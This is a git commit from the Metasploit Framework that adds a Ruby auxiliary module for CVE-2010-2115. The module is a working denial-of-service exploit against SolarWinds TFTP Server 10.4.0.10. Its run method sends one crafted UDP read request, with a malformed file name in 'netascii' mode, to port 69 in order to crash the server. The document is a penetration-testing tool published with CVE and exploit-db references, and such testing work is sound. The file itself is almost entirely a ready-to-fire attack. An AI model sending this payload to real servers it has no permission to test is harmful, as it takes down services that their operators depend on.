83af27d0b885cf49e81b3463646db599c352ed01
Joshua Drake <github.jdrake@qoop.org>
2010-06-04 01:20:19 +0000

    add aux module to trigger cve-2010-2115 from Elliot Cutright
    git-svn-id: file:///home/svn/framework3/trunk@9417 4d416f70-5f16-0410-b530-b9f4589650da

---
+++ modules/auxiliary/dos/windows/tftp/solarwinds.rb
@@ -0,0 +1,49 @@
+##
+# $Id$
+##
+
+##
+# This file is part of the Metasploit Framework and may be subject to
+# redistribution and commercial restrictions. Please see the Metasploit
+# Framework web site for more information on licensing and terms of use.
+# http://metasploit.com/framework/
+##
+
+require 'msf/core'
+
+class Metasploit3 < Msf::Auxiliary
+
+	include Msf::Exploit::Remote::Udp
+	include Msf::Auxiliary::Dos
+
+	def initialize(info = {})
+		super(update_info(info,
+			'Name'           => 'SolarWinds TFTP Server 10.4.0.10 Denial of Service' ,
+			'Description'    => %q{
+					The SolarWinds TFTP server can be shut down by sending a 'netascii' read
+				request with a specially crafted file name.
+			},
+			'Author'         => 'Nullthreat',
+			'License'        => MSF_LICENSE,
+			'Version'        => '$Revision$',
+			'References'     =>
+				[ 
+					[ 'CVE', '2010-2115' ],
+					[ 'OSVDB', '64845' ],
+					[ 'URL', 'http://www.exploit-db.com/exploits/12683' ]
+				],
+			'DisclosureDate' => 'May 21 2010'))
+
+		register_options([
+			Opt::RPORT(69)
+		])
+	end
+
+	def run
+		connect_udp
+		print_status("Sending Crash request...")
+		udp_sock.put("\x00\x01\x01\x00\x6e\x65\x74\x61\x73\x63\x69\x69\x00")
+		disconnect_udp
+	end
+
+end
